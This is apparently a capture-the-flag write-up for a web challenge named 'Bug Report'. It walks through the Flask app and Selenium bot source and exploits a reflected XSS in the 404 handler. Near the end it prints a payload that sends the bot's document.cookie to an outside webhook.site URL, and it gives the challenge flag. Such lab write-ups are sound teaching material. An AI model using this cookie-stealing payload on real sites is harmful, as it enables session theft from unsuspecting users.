---
title : CyberApocalypse Bug Report Writeup
tags : xss ssrf
---



# Challenge



![](/img/apocalypse/BugReport.png)



## Solution



we are also given the source file [here](/assets/web_bug_report.zip)


which had the following


![](/img/apocalypse/contents.png)


and the challenge 


![](/img/apocalypse/challenge1.png)


the two python scripts as follows


```python
from flask import Flask, request, render_template
from urllib.parse import unquote
from bot import visit_report

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/submit", methods=["POST"])
def submit():
    try:
        url = request.json.get("url")
        
        assert(url.startswith('http://') or url.startswith('https://'))
        visit_report(url)

        return {"success": 1, "message": "Thank you for your valuable submition!"}
    except:
        return {"failure": 1, "message": "Something went wrong."}


@app.errorhandler(404)
def page_not_found(error): 
    return "<h1>URL %s not found</h1><br/>" % unquote(request.url), 404

app.run(host="0.0.0.0", port=1337)
```

brief look at it, nothing much it just forwards our reported url to the bot


but bot.py was interesting


```python
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait

def visit_report(url):

    options = Options()
    options.add_argument('headless')
    options.add_argument('no-sandbox')
    options.add_argument('disable-dev-shm-usage')
    options.add_argument('disable-infobars')
    options.add_argument('disable-background-networking')
    options.add_argument('disable-default-apps')
    options.add_argument('disable-extensions')
    options.add_argument('disable-gpu')
    options.add_argument('disable-sync')
    options.add_argument('disable-translate')
    options.add_argument('hide-scrollbars')
    options.add_argument('metrics-recording-only')
    options.add_argument('mute-audio')
    options.add_argument('no-first-run')
    options.add_argument('dns-prefetch-disable')
    options.add_argument('safebrowsing-disable-auto-update')
    options.add_argument('media-cache-size=1')
    options.add_argument('disk-cache-size=1')
    options.add_argument('user-agent=BugHTB/1.0')
    browser = webdriver.Chrome('chromedriver', options=options, service_args=['--verbose', '--log-path=/tmp/chromedriver.log'])

    browser.get('http://127.0.0.1:1337/')

    browser.add_cookie({
        'name': 'flag',
        'value': 'CHTB{f4k3_fl4g_f0r_t3st1ng}'
    })

    try:
        browser.get(url)
        WebDriverWait(browser, 5).until(lambda r: r.execute_script('return document.readyState') == 'complete')
    except:
        pass
    finally:
        browser.quit()
```


```python
browser.get('http://127.0.0.1:1337/')

    browser.add_cookie({
        'name': 'flag',
        'value': 'CHTB{f4k3_fl4g_f0r_t3st1ng}'`
```

 
 using this piece of code we can see that the bot visits the url sent and adds some cookies to it

 ...

 with that i decided to use ssrf and xss, 

 ssrf by using the ip 127.0.0.1:1337 and xss using [hookbin](https://hookbin.com) and an xss payload to steal the cookie


 my final payload was 


`https://127.0.0.1:1337/<script>document.write('<img src="https://webhook.site/e923b472-7002-4b02-902d-61f0eedebbe9/?c='%2bdocument.cookie%2b'" />');</script>`

as 

![](/img/apocalypse/bugreport.png)


and a few seconds later we got the flag leak on our hookbin instance


![](/img/apocalypse/flagforbug.png)



#### Flag : CHTB{th1s_1s_my_bug_r3p0rt}